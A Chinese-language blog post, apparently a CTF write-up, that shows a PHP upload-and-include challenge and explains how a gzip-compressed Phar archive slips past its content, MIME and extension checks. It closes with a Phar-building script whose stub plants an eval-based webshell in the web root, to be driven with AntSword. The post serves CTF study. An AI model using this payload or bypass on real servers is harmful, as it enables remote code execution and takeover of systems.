---
title: PHP文件上传不含PHP代码实现RCE的方法
date: 2026-04-18
tags: [RCE专题]
categories: 
  - web安全
  - PHP安全 
excerpt: 不含PHP代码的文件上传
---

# PHP文件上传不含PHP代码实现RCE的方法

## ?CTF2025复现

### 题目源码

```php
<?php
error_reporting(0);

$allowed_extensions = ['zip', 'bz2', 'gz', 'xz', '7z'];
$allowed_mime_types = [
    'application/zip',
    'application/x-bzip2',
    'application/gzip',`
    'application/x-gzip',
    'application/x-xz',
    'application/x-7z-compressed',
];


function filter($tempfile)
{
    $data = file_get_contents($tempfile);
    if (
        stripos($data, "__HALT_COMPILER();") !== false || stripos($data, "PK") !== false ||
        stripos($data, "<?") !== false || stripos(strtolower($data), "<?php") !== false
    ) {
        return true;
    }
    return false;
}

if ($_SERVER["REQUEST_METHOD"] == 'POST') {
    if (is_uploaded_file($_FILES['file']['tmp_name'])) {
        if (filter($_FILES['file']['tmp_name']) || !isset($_FILES['file']['name'])) {
            die("Nope :<");
        }

        // mimetype check
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
        finfo_close($finfo);

        if (!in_array($mime_type, $allowed_mime_types)) {
            die('unexpected mimetype');
        }

        // ext check
        $ext = strtolower(pathinfo(basename($_FILES['file']['name']), PATHINFO_EXTENSION));

        if (!in_array($ext, $allowed_extensions)) {
            die('unexpected extension');
        }

        if (move_uploaded_file($_FILES['file']['tmp_name'], "/tmp/" . basename($_FILES['file']['name']))) {
            echo "File upload success!Please include with 'url'";
        }else{
            echo "fail";
        }     
    }
}

if (isset($_GET['url'])) {
    
$include_url = basename($_GET['url']);


if (!preg_match("/\.(zip|bz2|gz|xz|7z)/i", $include_url)) {
    die("unexpected extension");
}

include '/tmp/' . $include_url;
exit;
}
?>
```

#### 源码分析

这里我们很明显能看到有三道防线：

1. `filter`函数：在我们读取的文件内容中不能包含`__HALT_COMPILER();`(防 phar 存根)、`PK`(防Zip头)、`<?/<?php`(防普通马)。
2. `finfo_file()`函数进行MIME类型检验：只允许白名单内的压缩包格式。
3. 后缀名检验：只允许白名单内的后缀名。

##### 部分概念的解读

`__HALT_COMPILER()`：这是一个编译器指令，作用是：当php引擎读到这个指令时停止解析，后面的内容不会检查语法，也不会尝试执行。

这个指令也是 Phar 归档文件的硬性要求：一个标准的 Phar 文件的结构为：[可执行 PHP 存根代码]+`__HALT_COMPILER();`+[压缩的二进制数据块]

**什么是可执行PHP存根代码？**

PHP存根代码（Stub）是 Phar 文件格式规定的一个**引导加载程序**，可以理解为 Phar 这个“压缩包”的自解压和启动程序。

这是一个简单的 PHP 文件，在 Phar 文件被`include`包含或者直接通过命令执行时会最先运行，核心任务时初始化 Phar 环境并加载内部的业务代码。

在CTF中，这是一个理想的代码注入点，因为这是 Phar 文件被包含的第一入口，放在这里的恶意代码会被自动执行。

那为什么明明已经ban了`__HALT_COMPILER()`payload中依然会有呢？

我们上传的文件时一个gz之类的压缩包，而`file_get_contents()`读取文件时读取的整个文件的二进制流，而里面的内容是被 gzip 算法加密过的乱码数据，自然读取不到。

而在`include`中，如果我们上传的文件中包含`.phar`，且没有用像`phar://`之类的形式，PHP会认为是本地文件，然后 Phar 扩展识别发现该文件是合法的 phar 文件后按照 phar文件处理。在过程中会自动解压文件。

### 攻击手法

```php
<?php
$phar=new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub('<?php file_put_contents("/var/www/html/shell.php","<?php eval(\$_POST[\'cmd\']); ?>"); __HALT_COMPILER(); ?>');
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
```

利用这段代码生成一个 phar 文件，然后压缩成 gz 文件并上传，连接蚁剑即可。























